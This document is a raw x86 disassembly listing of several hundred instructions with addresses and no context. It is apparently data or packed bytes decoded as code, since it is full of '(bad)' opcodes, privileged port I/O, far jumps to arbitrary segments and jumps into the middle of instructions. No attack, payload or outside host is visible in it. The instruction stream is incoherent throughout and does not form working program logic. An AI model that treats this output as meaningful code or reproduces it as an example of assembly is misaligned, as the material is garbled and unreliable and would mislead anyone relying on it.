  418931:	sub    BYTE PTR [edx],dl
  418933:	outs   dx,BYTE PTR ds:[esi]
  418934:	push   eax
  418935:	mov    BYTE PTR [edi-0x3b10f7a9],ch
  41893b:	cdq    
  41893c:	mov    BYTE PTR [edi],0x1
  41893f:	xchg   ebp,eax
  418940:	push   ss
  418941:	je     0x41893d
  418943:	sub    ecx,ebx
  418945:	push   ecx
  418946:	fwait
  418947:	mov    eax,0x947b4d7
  41894c:	out    dx,al
  41894d:	or     BYTE PTR [edi+edi*1-0x3124d1b4],dl
  418954:	aaa    
  418955:	mov    edi,0xd27f8e5d
  41895a:	rcl    DWORD PTR [ecx-0x5c01b42],0x0
  418961:	pop    es
  418962:	mov    ss,WORD PTR [ecx]
  418964:	retf   0x17b2
  418967:	imul   edx,DWORD PTR [edi+0x1a9e3976],0x76
  41896e:	xlat   BYTE PTR ds:[ebx]
  41896f:	je     0x4189ce
  418971:	lock cmp ebx,DWORD PTR [ecx-0xa]
  418975:	loop   0x4189a7
  418977:	push   ebp
  418978:	in     eax,dx
  418979:	js     0x4189c4
  41897b:	jnp    0x41896f
  41897d:	(bad)  ds:0x1ffcfd68
  418983:	gs inc eax
  418985:	in     al,dx
  418986:	retf   
  418987:	pop    ebp
  418988:	xchg   ebp,eax
  418989:	lahf   
  41898a:	sti    
  41898b:	stc    
  41898c:	ds ret 0x975f
  418990:	rcl    ah,cl
  418992:	lock push ebp
  418994:	push   ebx
  418995:	test   BYTE PTR [ebx+0x75c921c4],ah
  41899b:	mov    ecx,cs
  41899d:	mov    WORD PTR [ecx+0x1710a867],es
  4189a3:	out    0xb8,eax
  4189a5:	imul   ebx,DWORD PTR [esi-0x7b],0x6c
  4189a9:	ins    DWORD PTR es:[edi],dx
  4189aa:	lea    eax,[eax+0x7c]
  4189ad:	jno    0x418971
  4189af:	mov    edi,ecx
  4189b1:	out    dx,al
  4189b2:	sahf   
  4189b3:	int    0x5a
  4189b5:	popf   
  4189b6:	repnz cmc 
  4189b8:	jae    0x41898c
  4189ba:	outs   dx,BYTE PTR ds:[esi]
  4189bb:	mov    ebx,0x1ca2b1b4
  4189c0:	test   bh,ch
  4189c2:	sbb    BYTE PTR [eax+edx*4+0x7118e038],0xc5
  4189ca:	call   FWORD PTR [ebp+0x2b495773]
  4189d0:	rcr    DWORD PTR [edx],0x6a
  4189d3:	out    dx,al
  4189d4:	xchg   ecx,eax
  4189d5:	lea    ebx,[edi+edi*1+0x5d]
  4189d9:	test   BYTE PTR fs:[ecx-0x5a],dh
  4189dd:	js     0x418a03
  4189df:	mov    edi,0x196fe8b8
  4189e4:	jl     0x418971
  4189e6:	in     al,0x5a
  4189e8:	ror    DWORD PTR [eax+ebp*2],1
  4189eb:	push   ss
  4189ec:	xchg   bl,bl
  4189ee:	and    dl,bh
  4189f0:	xchg   ebx,eax
  4189f1:	mov    edi,0x86e6c608
  4189f6:	jnp    0x418a00
  4189f8:	dec    eax
  4189f9:	lahf   
  4189fa:	rcl    DWORD PTR [ebp-0x33e30619],1
  418a00:	cdq    
  418a01:	test   BYTE PTR [edx-0x3e],dh
  418a04:	sahf   
  418a05:	and    cl,BYTE PTR [ecx-0x63]
  418a08:	les    edx,FWORD PTR [esi]
  418a0a:	hlt    
  418a0b:	and    ebx,esp
  418a0d:	repnz shl BYTE PTR [edx],0xfe
  418a11:	inc    esi
  418a12:	pop    esi
  418a13:	shl    DWORD PTR [esi],cl
  418a15:	push   ecx
  418a16:	outs   dx,BYTE PTR ds:[esi]
  418a17:	mov    eax,ds:0xfe6f330c
  418a1c:	mov    al,ah
  418a1e:	mov    dh,0xd6
  418a20:	cs or  al,0x25
  418a23:	push   ebx
  418a24:	pop    ds
  418a25:	sbb    BYTE PTR [ebp+0x4fe2b16c],0xd7
  418a2c:	fidiv  WORD PTR [esi]
  418a2e:	pop    esi
  418a2f:	dec    esp
  418a30:	push   ss
  418a31:	retf   0xef00
  418a34:	add    esp,edx
  418a36:	push   ecx
  418a37:	addr16 mov ch,0x54
  418a3a:	inc    ebp
  418a3b:	mov    BYTE PTR [edx+0x66f8af41],ah
  418a41:	add    eax,0x90a1a398
  418a46:	cwde   
  418a47:	mov    ds:0x43186166,eax
  418a4c:	mov    dl,0x8f
  418a4e:	pop    esi
  418a4f:	comiss xmm5,DWORD PTR [ebx]
  418a52:	fimul  DWORD PTR [ecx]
  418a54:	sub    dh,ch
  418a56:	xchg   cl,cl
  418a58:	jge    0x418a01
  418a5a:	(bad)  
  418a5b:	ins    BYTE PTR es:[edi],dx
  418a5c:	into   
  418a5d:	adc    eax,0x70055f92
  418a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a63:	push   edx
  418a64:	jl     0x418aa2
  418a66:	not    BYTE PTR [eax+ecx*1]
  418a69:	loope  0x418a63
  418a6b:	and    eax,0x3e833745
  418a70:	xchg   dl,al
  418a72:	loope  0x418a36
  418a74:	inc    eax
  418a75:	mov    esi,0x50098b70
  418a7a:	mov    edi,0x922b74ce
  418a7f:	pop    eax
  418a80:	mov    dl,0xa4
  418a82:	lds    esi,FWORD PTR [edx-0x5b]
  418a85:	fs xor eax,0xda41ba9b
  418a8b:	xchg   BYTE PTR [edx+ebp*4],bl
  418a8e:	test   BYTE PTR [ecx+0x10e75dfc],bl
  418a94:	jae    0x418a9c
  418a96:	dec    edi
  418a97:	fs and eax,0x8e666b74
  418a9d:	data16 fbstp TBYTE PTR [esi-0x487d6918]
  418aa4:	push   eax
  418aa5:	inc    esi
  418aa6:	cs aam 0xae
  418aa9:	add    BYTE PTR [ebx],bh
  418aab:	mov    esi,0x33cde39c
  418ab0:	addr16 push esi
  418ab2:	repnz lds ebp,FWORD PTR [edx+0x5fd1c402]
  418ab9:	test   BYTE PTR gs:[edi-0x31f3395a],bl
  418ac0:	add    ebx,esp
  418ac2:	xchg   ecx,eax
  418ac3:	gs push cs
  418ac5:	addr16 sti 
  418ac7:	xchg   ecx,eax
  418ac8:	mov    edi,DWORD PTR [ebx+0x5e]
  418acb:	mov    ebp,0xb607eebd
  418ad0:	in     eax,0xfd
  418ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad3:	add    edx,eax
  418ad5:	adc    eax,0x4e2912d1
  418ada:	push   ebp
  418adb:	rol    BYTE PTR [eax],cl
  418add:	mov    eax,0x562d0d77
  418ae2:	jne    0x418ae9
  418ae4:	push   cs
  418ae5:	jg     0x418b1f
  418ae7:	fisubr WORD PTR [edx+0x471d512f]
  418aed:	mov    eax,0xe0e58495
  418af2:	in     eax,dx
  418af3:	lea    esi,[esi-0x57]
  418af6:	add    al,0x8f
  418af8:	lods   eax,DWORD PTR ds:[esi]
  418af9:	sub    eax,0xe7fc6621
  418afe:	xor    eax,0x30f711eb
  418b03:	xchg   BYTE PTR [ebx-0x41541278],dl
  418b09:	fisubr WORD PTR [esi+0x4f]
  418b0c:	inc    ebp
  418b0d:	sti    
  418b0e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418b10:	and    cl,BYTE PTR [esi]
  418b12:	in     eax,dx
  418b13:	push   esp
  418b14:	push   ebx
  418b15:	ins    DWORD PTR es:[edi],dx
  418b16:	ins    BYTE PTR es:[edi],dx
  418b17:	fild   QWORD PTR [esi]
  418b19:	rcl    ah,cl
  418b1b:	ds pop edi
  418b1d:	xchg   esi,eax
  418b1e:	cmpxchg BYTE PTR [esi+0x561e6e63],ch
  418b25:	pop    ebx
  418b26:	sbb    al,0xcc
  418b28:	daa    
  418b29:	aad    0x60
  418b2b:	xor    bl,BYTE PTR [ebx]
  418b2d:	push   ebx
  418b2e:	mov    bh,0x5c
  418b30:	arpl   WORD PTR [eax],sp
  418b32:	dec    edx
  418b33:	(bad)  [ebx-0x60f03b3a]
  418b39:	xor    dh,BYTE PTR ds:0x4488940b
  418b3f:	shl    esi,1
  418b41:	adc    al,0x73
  418b43:	les    edi,FWORD PTR [ebp-0x32]
  418b46:	out    0x37,al
  418b48:	sub    DWORD PTR [esi],0x98dcf2c7
  418b4e:	sbb    eax,0x6216b098
  418b53:	xchg   DWORD PTR [ebp+0x27213c3c],esi
  418b59:	push   ds
  418b5a:	cmc    
  418b5b:	cdq    
  418b5c:	rol    DWORD PTR [ebp-0x5b],0xf1
  418b60:	mov    ah,0x8b
  418b62:	push   ds
  418b63:	test   eax,0x1897d0c3
  418b68:	pop    ebp
  418b69:	outs   dx,DWORD PTR ds:[esi]
  418b6a:	xchg   edx,eax
  418b6b:	loop   0x418b63
  418b6d:	inc    edi
  418b6e:	pop    ss
  418b6f:	mov    WORD PTR [edi-0x19d64685],gs
  418b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b76:	cmp    al,0xb3
  418b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b79:	lea    esp,[esi]
  418b7b:	adc    al,0xbe
  418b7d:	out    dx,al
  418b7e:	mov    ecx,eax
  418b80:	or     ecx,DWORD PTR [edx+edx*4]
  418b83:	dec    eax
  418b84:	mov    DWORD PTR [ebx+eiz*1],esi
  418b87:	out    dx,eax
  418b88:	mov    ah,ch
  418b8a:	cmp    DWORD PTR [eax],ebp
  418b8c:	mov    ch,BYTE PTR [edx+0x24526ea6]
  418b92:	push   0xd1b4f096
  418b97:	test   eax,0xd0554808
  418b9c:	mov    eax,ds:0x3046debd
  418ba1:	jg     0x418b8d
  418ba3:	push   edx
  418ba4:	retf   
  418ba5:	xchg   edx,esi
  418ba7:	iret   
  418ba8:	cmp    al,0x63
  418baa:	inc    eax
  418bab:	xor    eax,0xed95e8e0
  418bb0:	rol    DWORD PTR [eax+eiz*1+0x2],0xc6
  418bb5:	xchg   edx,eax
  418bb6:	xbegin 0x7fea693a
  418bbc:	fwait
  418bbd:	mov    dh,0xd1
  418bbf:	out    dx,eax
  418bc0:	int3   
  418bc1:	xchg   ebx,eax
  418bc2:	push   eax
  418bc3:	clc    
  418bc4:	mov    fs,WORD PTR [esi-0x2976b4ff]
  418bca:	in     al,0x23
  418bcc:	mov    esi,0x1048d798
  418bd1:	into   
  418bd2:	cmp    ebp,DWORD PTR [edi+ebp*4]
  418bd5:	aad    0x3d
  418bd7:	mov    cl,0xe0
  418bd9:	xor    cl,dl
  418bdb:	pop    edi
  418bdc:	arpl   WORD PTR [eax+0x7b64b75a],sp
  418be2:	mov    dh,0xc5
  418be4:	jp     0x418c53
  418be6:	iret   
  418be7:	fist   DWORD PTR [ecx-0x6f]
  418bea:	mov    esp,0xe0166def
  418bef:	paddusb mm7,QWORD PTR [edx+eax*8+0x6e613f8]
  418bf7:	js     0x418be4
  418bf9:	or     esp,DWORD PTR [edi+edx*8]
  418bfc:	sub    eax,0x60532cd
  418c01:	sbb    eax,0xff8e13d4
  418c06:	ror    DWORD PTR [ebp-0x4db64550],cl
  418c0c:	xor    eax,DWORD PTR [esi]
  418c0e:	or     eax,0x2e35a2a9
  418c13:	adc    esi,edi
  418c15:	jnp    0x418bc2
  418c17:	leave  
  418c18:	sti    
  418c19:	mul    DWORD PTR [eax+0x61]
  418c1c:	add    bh,al
  418c1e:	(bad)  
  418c1f:	jb     0x418c2e
  418c21:	sub    ch,bh
  418c23:	mov    WORD PTR [esp+eax*1-0x1b4268ec],cs
  418c2a:	bound  esi,QWORD PTR [edi-0x5d]
  418c2d:	xchg   ebp,eax
  418c2e:	arpl   dx,cx
  418c30:	nop
  418c31:	ss in  ax,dx
  418c34:	shl    edi,cl
  418c36:	addr16 mov ch,0xff
  418c39:	sbb    al,0x54
  418c3b:	cmp    ebp,edi
  418c3d:	outs   dx,DWORD PTR ds:[esi]
  418c3e:	ins    DWORD PTR es:[edi],dx
  418c3f:	push   ds
  418c40:	lahf   
  418c41:	sub    DWORD PTR [edi],0xc5493774
  418c47:	or     DWORD PTR [eax-0x34],eax
  418c4a:	add    BYTE PTR [ecx+0x1e],bl
  418c4d:	(bad)  
  418c4e:	dec    esp
  418c4f:	(bad)  [ebx]
  418c51:	aad    0xf5
  418c53:	enter  0x1b62,0x9e
  418c57:	mov    ds:0xaf2b9a07,al
  418c5c:	xor    al,0xf8
  418c5e:	adc    dl,BYTE PTR [ebx+0x5d6e92a5]
  418c64:	cmp    BYTE PTR [edx+0x3e65407b],al
  418c6a:	mov    esi,0xc6e0b56d
  418c6f:	mov    dl,BYTE PTR [esi+ecx*8+0x3c]
  418c73:	(bad)  
  418c74:	sub    ebp,DWORD PTR [edx*2+0x4f08009]
  418c7b:	adc    eax,0x47df3ec6
  418c80:	adc    ch,bl
  418c82:	xchg   edi,eax
  418c83:	dec    edi
  418c84:	aaa    
  418c85:	pop    ecx
  418c86:	and    eax,0xfeb742
  418c8b:	jae    0x418cb1
  418c8d:	mov    ebx,0xa94f357f
  418c92:	scas   eax,DWORD PTR es:[edi]
  418c93:	pop    eax
  418c95:	cmc    
  418c96:	shr    BYTE PTR [ecx-0x500507e6],cl
  418c9c:	push   ebx
  418c9d:	xor    esp,ebx
  418c9f:	jnp    0x418c2d
  418ca1:	sbb    edi,edx
  418ca3:	dec    eax
  418ca4:	jl     0x418c2b
  418ca6:	mov    ecx,edx
  418ca8:	xchg   edi,eax
  418ca9:	push   ss
  418caa:	cmp    ecx,DWORD PTR [ebp-0x80]
  418cad:	gs jmp 0x418c34
  418cb0:	and    eax,0x4b58975f
  418cb5:	jne    0x191dd157
  418cbb:	jecxz  0x418cfc
  418cbd:	rcr    DWORD PTR [eax+edi*2+0x5a],cl
  418cc1:	xchg   edx,eax
  418cc2:	xchg   esi,eax
  418cc3:	(bad)  
  418cc4:	fcmovu st,st(1)
  418cc6:	mov    ecx,0x661241af
  418ccb:	or     BYTE PTR [esi+0x52],ah
  418cce:	imul   ecx,ebx,0xffffffce
  418cd1:	push   0x36
  418cd3:	jecxz  0x418c59
  418cd5:	fild   QWORD PTR es:[edi-0x58]
  418cd9:	jle    0x418d0e
  418cdb:	push   esp
  418cdc:	xor    ecx,esp
  418cde:	jns    0x418cea
  418ce0:	sub    BYTE PTR [esi-0x63],0xf4
  418ce4:	shl    BYTE PTR [ebp-0x3b],0x4e
  418ce8:	clc    
  418ce9:	jmp    0x427a:0x9f8cf64c
  418cf0:	stos   BYTE PTR es:[edi],al
  418cf1:	mov    ebp,0xefce57c8
  418cf6:	fimul  WORD PTR [esi]
  418cf8:	out    dx,al
  418cf9:	fmul   DWORD PTR [ecx+ebx*2+0x70]
  418cfd:	fild   WORD PTR [ebx-0x196e15be]
  418d03:	mov    ecx,0xc365aea4
  418d08:	jp     0x418d87
  418d0a:	push   esp
  418d0b:	mov    dl,0xc5
  418d0d:	int3   
  418d0e:	lea    edx,[eax+0x13]
  418d11:	xchg   edi,eax
  418d12:	sub    BYTE PTR ds:0x58e42c99,0x5b
  418d19:	xlat   BYTE PTR ds:[ebx]
  418d1a:	dec    BYTE PTR [edx+0x32]
  418d1d:	leave  
  418d1e:	add    ch,BYTE PTR [eax-0x4060a2e4]
  418d24:	scas   al,BYTE PTR es:[edi]
  418d25:	popa   
  418d26:	mov    esp,0x9decdaab
  418d2b:	adc    eax,0xc7cfbc22
  418d30:	mov    bh,0x12
  418d32:	or     eax,0x45dc57bb
  418d37:	mov    es,WORD PTR [edx-0x59]
  418d3a:	fstp   TBYTE PTR [edi+0x6e]
  418d3d:	hlt    
  418d3e:	out    0x40,al
  418d40:	dec    edx
  418d41:	mov    esp,0x44f97139
  418d46:	mov    bl,0x8d
  418d48:	mov    eax,ds:0xa679bd5a
  418d4d:	push   cs
  418d4e:	fist   DWORD PTR [ebx+0x29ce7b6]
  418d54:	(bad)  
  418d55:	clc    
  418d56:	push   cs
  418d57:	pop    es
  418d58:	or     eax,0x369b2f8f
  418d5d:	iret   
  418d5e:	push   ss
  418d5f:	outs   dx,BYTE PTR ds:[esi]
  418d60:	push   esi
  418d61:	sub    al,0x83
  418d63:	sbb    eax,0x1ade4800
  418d68:	mov    esi,0x2f0bf88c
  418d6d:	xchg   edx,eax
  418d6e:	inc    eax
  418d6f:	aas    
  418d70:	xchg   esi,eax
  418d71:	out    dx,eax
  418d72:	(bad)  
  418d73:	loopne 0x418dcb
  418d75:	cmp    al,0xd
  418d77:	fsubr  st(2),st
  418d79:	push   ss
  418d7a:	stos   BYTE PTR es:[edi],al
  418d7b:	shl    BYTE PTR [eax+ecx*4-0x72602829],1
  418d82:	xchg   BYTE PTR [esi+0x6b5c2b10],cl
  418d88:	leave  
  418d89:	popf   
  418d8a:	test   ebp,eax
  418d8c:	out    dx,al
  418d8d:	pop    ecx
  418d8e:	xor    DWORD PTR [edx+0xd6efad0],edi
  418d94:	dec    esi
  418d95:	inc    esp
  418d96:	add    al,0x43
  418d98:	retf   0xa1ac
  418d9b:	add    al,0x8d
  418d9d:	scas   al,BYTE PTR es:[edi]
  418d9e:	scas   eax,DWORD PTR es:[edi]
  418d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da0:	js     0x418dc9
  418da2:	mov    ebp,0xe69aa07
  418da7:	add    eax,DWORD PTR [edx+0x33ddfb33]
  418dad:	jb     0x418d7e
  418daf:	dec    ebp
  418db0:	mov    ebx,0x36ab5b0f
  418db5:	jle    0x418def
  418db7:	sar    DWORD PTR cs:[edi-0xf9daaba],1
  418dbe:	jecxz  0x418e0d
  418dc0:	adc    ecx,DWORD PTR [eax]
  418dc2:	push   eax
  418dc3:	xor    ebp,0xd5f12def
  418dc9:	fdivp  st(3),st
  418dcb:	outs   dx,BYTE PTR ds:[esi]
  418dcc:	mov    ecx,0x3bd95d2c
  418dd1:	sahf   
  418dd2:	inc    edi
  418dd3:	lods   eax,DWORD PTR ds:[esi]
  418dd4:	inc    ecx
  418dd5:	xchg   ebx,eax
  418dd6:	out    dx,al
  418dd7:	jmp    0xa2ba3018
  418ddc:	sub    BYTE PTR [edi],ch
  418dde:	add    BYTE PTR [eax],al
  418de0:	add    BYTE PTR [eax],al
  418de2:	mov    dl,0x57
  418de4:	push   0xffffffc9
  418de6:	out    dx,eax
  418de7:	std    
  418de8:	mov    bl,0x7f
  418dea:	push   ebx
  418deb:	jg     0x418e10
  418ded:	mov    ecx,0x25667b58
  418df2:	cmc    
  418df3:	or     al,BYTE PTR [ecx]
  418df5:	add    ah,dh
  418df7:	add    al,0x0
  418df9:	add    BYTE PTR [esi+0x2f68004],dl
  418dff:	cmp    ah,0x20
  418e02:	sub    DWORD PTR [edx+0x248f1340],ecx
  418e08:	ins    DWORD PTR es:[edi],dx
  418e09:	mov    eax,DWORD PTR [ecx+0x2df8a16c]
  418e0f:	or     al,0x93
  418e11:	enter  0x7b4,0x9a
  418e15:	push   0xffffffcb
  418e17:	in     eax,dx
  418e18:	mov    ds:0x35117235,eax
  418e1d:	inc    ecx
  418e1e:	jae    0x418e50
  418e20:	xchg   DWORD PTR [ecx+edx*4-0x2e],eax
  418e24:	ret    
  418e25:	push   cs
  418e26:	lea    esp,[ecx+0x6107c8bd]
  418e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e2d:	inc    eax
  418e2e:	add    ch,BYTE PTR [edx+0x50]
  418e31:	ja     0x418e7b
  418e33:	jbe    0x418e9f
  418e35:	mov    dh,BYTE PTR [eax-0x6]
  418e38:	out    0xee,al
  418e3a:	ret    0xa514
  418e3d:	iret   
  418e3e:	aas    
  418e3f:	push   ecx
  418e40:	push   ecx
  418e41:	xchg   ecx,eax
  418e42:	imul   edx,DWORD PTR [ecx+0x1e8efe63],0x6b
  418e49:	dec    ebx
  418e4a:	add    ah,BYTE PTR [ecx-0x51]
  418e4d:	xchg   esi,eax
  418e4e:	fldenv [edx]
  418e50:	fld    QWORD PTR [esi+ecx*4]
  418e53:	add    BYTE PTR [edx-0x66],bh
  418e56:	ret    
  418e57:	inc    esi
  418e58:	xchg   ebp,eax
  418e59:	and    cl,bl
  418e5b:	xchg   BYTE PTR [esi],ch
  418e5d:	mov    ebp,0xba0d4dbe
  418e62:	js     0x418e98
  418e64:	push   eax
  418e65:	dec    dx
  418e67:	jnp    0x418e77
  418e69:	stc    
  418e6a:	pushf  
  418e6b:	outs   dx,BYTE PTR ds:[esi]
  418e6c:	mov    edx,0x57dc7d58
  418e71:	sbb    DWORD PTR [ebx],ebx
  418e73:	clc    
  418e74:	arpl   WORD PTR [ecx],sp
  418e76:	rcr    DWORD PTR [edx+ecx*2+0x7c377e83],1
  418e7d:	imul   ebx,DWORD PTR [edx],0xeb316b48
  418e83:	iret   
  418e84:	das    
  418e85:	fnsave [eax]
  418e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e88:	outs   dx,DWORD PTR ds:[esi]
  418e89:	and    esp,edi
  418e8b:	fmul   st,st(6)
  418e8d:	mov    edi,0xf9a85b1
  418e92:	dec    edi
  418e93:	stos   DWORD PTR es:[edi],eax
  418e94:	bound  eax,QWORD PTR [edx+0x44527d89]
  418e9a:	stos   BYTE PTR es:[edi],al
  418e9b:	cli    
  418e9c:	sub    ebx,DWORD PTR [ecx-0x50]
  418e9f:	mov    WORD PTR [ebx+0x41db3b01],gs
  418ea5:	pop    esi
  418ea6:	xchg   ebx,eax
  418ea7:	mov    ah,0xab
  418ea9:	xchg   esi,eax
  418eaa:	scas   al,BYTE PTR es:[edi]
  418eab:	setns  BYTE PTR [edx-0x49]
  418eaf:	pop    ss
  418eb0:	xor    DWORD PTR [esi-0x5a],ebx
  418eb3:	mov    ebp,0xca5ad7ab
  418eb8:	bound  edi,QWORD PTR [esi+0x5e5f36e1]
  418ebe:	call   0xa276d6b7
  418ec3:	imul   ecx,DWORD PTR [eax+eiz*8-0x5231f9d0],0x88ea51bf
  418ece:	push   ds
  418ecf:	scas   al,BYTE PTR es:[edi]
  418ed0:	and    eax,DWORD PTR [eax+ebx*1+0x50d2988a]
  418ed7:	cmp    esp,DWORD PTR [edi+0x3d266712]
  418edd:	mov    BYTE PTR [ebx],bh
  418edf:	fst    DWORD PTR [ebx+0x1a]
  418ee2:	scas   eax,DWORD PTR es:[edi]
  418ee3:	ror    BYTE PTR [esi],cl
  418ee5:	test   al,0xca
  418ee7:	or     ebx,DWORD PTR [ebx-0x76]
  418eea:	imul   esp,DWORD PTR [edx+0x78],0xffffffb9
  418eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eef:	or     eax,0x9c38df19
  418ef4:	retf   
  418ef5:	pop    es
  418ef6:	pushf  
  418ef7:	push   cs
  418ef8:	dec    edi
  418ef9:	mov    dh,0xfc
  418efb:	inc    edi
  418efc:	out    0x3,eax
  418efe:	push   ebx
  418eff:	mov    WORD PTR [ebx],gs
  418f01:	js     0x418ea3
  418f03:	push   esp
  418f04:	ins    DWORD PTR es:[edi],dx
  418f05:	mov    ebx,0x72dfd318
  418f0a:	dec    edx
  418f0b:	jbe    0x418f29
  418f0d:	jmp    0x52985526
  418f12:	jnp    0x418ea5
  418f14:	jns    0x418f1b
  418f16:	cs push esi
  418f18:	and    BYTE PTR [esi+0x3f124c51],0xfd
  418f1f:	and    eax,DWORD PTR [edi-0x2877ce7c]
  418f25:	in     al,0x26
  418f27:	cmp    DWORD PTR ds:0xbb5056dd,ecx
  418f2d:	ins    BYTE PTR es:[edi],dx
  418f2e:	inc    esi
  418f2f:	dec    esp
  418f30:	inc    ebp
  418f31:	jmp    0x418f2b
  418f33:	bound  edx,QWORD PTR ds:0xb861697a
  418f39:	fisubr DWORD PTR gs:[ebp+esi*4-0x741a926f]
  418f41:	int    0xb
  418f43:	rcr    DWORD PTR ds:0x359dad17,cl
  418f49:	aas    
  418f4a:	xchg   esi,eax
  418f4b:	rcl    DWORD PTR ds:0xe9137ca9,1
  418f51:	jge    0x418f4a
  418f53:	and    dh,BYTE PTR [esi+0x35]
  418f56:	call   0x5337:0x7530ae51
  418f5d:	ss aas 
  418f5f:	or     eax,0x8541e855
  418f64:	push   eax
  418f65:	pop    eax
  418f66:	mov    edi,0x42793d03
  418f6b:	popa   
  418f6c:	fwait
  418f6d:	add    DWORD PTR [ebp+ecx*2+0x60c7c836],esi
  418f74:	pop    ds
  418f75:	ja     0x418ef9
  418f77:	enter  0xf223,0xfd
  418f7b:	jae    0x418f80
  418f7d:	icebp  
  418f7e:	cli    
  418f7f:	lods   al,BYTE PTR ds:[esi]
  418f80:	lods   al,BYTE PTR ds:[esi]
  418f81:	pop    es
  418f82:	rcl    DWORD PTR [edi+0x6a559a93],1
  418f88:	cmp    ah,BYTE PTR [edi-0x252e5078]
  418f8e:	inc    edi
  418f8f:	jnp    0x418f32
  418f91:	out    dx,al
  418f92:	add    ch,BYTE PTR [edx-0x69d670c9]
  418f98:	xor    dh,al
  418f9a:	sub    DWORD PTR [edi],0x8cb96b4e
  418fa0:	lods   eax,DWORD PTR ds:[esi]
  418fa1:	or     DWORD PTR [ecx+0x35],eax
  418fa4:	scas   al,BYTE PTR es:[edi]
  418fa5:	inc    eax
  418fa6:	sar    BYTE PTR [esi+0x3ba952ef],0x51
  418fad:	cmp    ch,BYTE PTR [ecx]
  418faf:	inc    edi
  418fb0:	jae    0x41901e
  418fb2:	mov    bh,0xf1
  418fb4:	cmp    DWORD PTR ds:[ebx],0xae597314
  418fbb:	jb     0x418f5d
  418fbd:	pusha  
  418fbe:	pop    esi
  418fbf:	push   ebx
  418fc0:	fcom   QWORD PTR [ebx-0x2f24fd1a]
  418fc6:	adc    BYTE PTR [esi+0xa],bl
  418fc9:	xchg   ebx,eax
  418fca:	inc    esp
  418fcb:	sub    edx,DWORD PTR [eax+0x14]
  418fce:	out    dx,eax
  418fcf:	lods   al,BYTE PTR ds:[esi]
  418fd0:	stos   BYTE PTR es:[edi],al
  418fd1:	dec    DWORD PTR [edx-0x47]
  418fd4:	and    al,0x56
  418fd6:	mov    ebp,esi
  418fd8:	inc    ebx
  418fd9:	inc    eax
  418fda:	mov    edi,0x3859bc72
  418fdf:	xor    eax,0xe9a8a741
  418fe4:	ror    DWORD PTR [edi],1
  418fe6:	fistp  WORD PTR [ecx]
  418fe8:	call   0xeb55:0x72eabb8f
  418fef:	lods   al,BYTE PTR ds:[esi]
  418ff0:	rcr    BYTE PTR [ecx],0x98
  418ff3:	xchg   dh,dh
  418ff5:	cmc    
  418ff6:	push   ebp
  418ff7:	dec    eax
  418ff8:	adc    edx,esi
  418ffa:	fcmovb st,st(1)
  418ffc:	dec    edx
  418ffd:	stos   DWORD PTR es:[edi],eax
  418ffe:	daa    
  418fff:	js     0x418fc1
  419001:	shl    BYTE PTR [ebx+0xa],0xc1
  419005:	and    esp,DWORD PTR [ebx-0x64]
  419008:	push   ecx
  419009:	fld    QWORD PTR [edx]
  41900b:	mov    ds:0x26a09b4e,al
  419010:	xor    eax,0xdf67b007
  419015:	jae    0x418fa1
  419017:	mov    edi,0xb0613c7b
  41901c:	pop    ss
  41901d:	mov    dl,bl
  41901f:	test   eax,0x2a08ee37
  419024:	sbb    DWORD PTR [eax-0x1b],edi
  419027:	out    dx,al
  419028:	jne    0x41901a
  41902a:	in     eax,dx
  41902b:	dec    ebx
  41902c:	xor    eax,DWORD PTR [edi+0x23]
  41902f:	retf   
  419030:	ins    DWORD PTR es:[edi],dx
  419031:	push   es
  419032:	scas   eax,DWORD PTR es:[edi]
  419033:	add    al,bl
  419035:	inc    ebx
  419036:	loopne 0x418fe2
  419038:	mov    al,ds:0x666b5562
  41903d:	inc    esi
  41903e:	jne    0x419058
  419040:	pusha  
  419041:	add    bl,BYTE PTR [esi]
  419043:	sbb    ebp,DWORD PTR [esp+ecx*8-0x54e98420]
  41904a:	adc    dl,BYTE PTR [edi-0x13d729ac]
  419050:	adc    eax,0x5df9c300
  419055:	in     al,dx
  419056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419057:	adc    ebx,DWORD PTR [esp+0x3b9b8c81]
  41905e:	push   ebp
  41905f:	sbb    DWORD PTR [eax*1+0x76f06a53],0x2e
  419067:	xor    DWORD PTR [ecx],esi
  419069:	je     0x418ff4
  41906b:	mov    dl,0xfd
  41906d:	push   cs
  41906e:	xchg   esi,eax
  41906f:	(bad)  
  419070:	mov    es,WORD PTR [edx+eiz*4]
  419073:	es ret 0x8996
  419077:	adc    BYTE PTR [ebp+edx*2+0x4b3d3e51],ah
  41907e:	mov    edi,0x9e98bbd7
  419083:	icebp  
  419084:	jo     0x4190ed
  419086:	sbb    eax,DWORD PTR [ebx+0x78]
  419089:	xchg   edi,eax
  41908a:	ret    0xc291
  41908d:	(bad)  
  41908e:	popa   
  41908f:	pop    edi
  419090:	out    dx,al
  419091:	xor    ch,BYTE PTR [edi+edx*8-0x7535e598]
  419098:	in     eax,dx
  419099:	adc    BYTE PTR [ecx-0x2b],ch
  41909c:	adc    eax,0xc120b67b
  4190a1:	mov    ds:0x1de65431,al
  4190a6:	(bad)  
  4190a8:	adc    edi,edx
  4190aa:	add    bl,dl
  4190ac:	add    esp,0xffffffe4
  4190af:	jge    0x419054
  4190b1:	xor    dh,BYTE PTR [edi-0x5fc53de2]
  4190b7:	mov    bh,0x5e
  4190b9:	cmp    ecx,esp
  4190bb:	pop    es
  4190bc:	sub    esp,0x3019f87
  4190c2:	xor    eax,0x30a51853
  4190c7:	(bad)  
  4190c8:	(bad)  
  4190c9:	cmp    edi,DWORD PTR [edi+0x67]
  4190cc:	sbb    eax,0xcb117bc0
  4190d1:	(bad)  
  4190d2:	mov    al,ds:0x53a49629
  4190d7:	into   
  4190d8:	hlt    
  4190d9:	add    esp,ebx
  4190db:	cmp    eax,0x177e341f
  4190e0:	jmp    0x4190b7
  4190e2:	jle    0x419145
  4190e4:	push   ecx
  4190e5:	mov    ebp,0x645375b2
  4190ea:	sub    BYTE PTR [esi+0x43],bl
  4190ed:	sub    BYTE PTR [esi],ah
  4190ef:	push   ebx
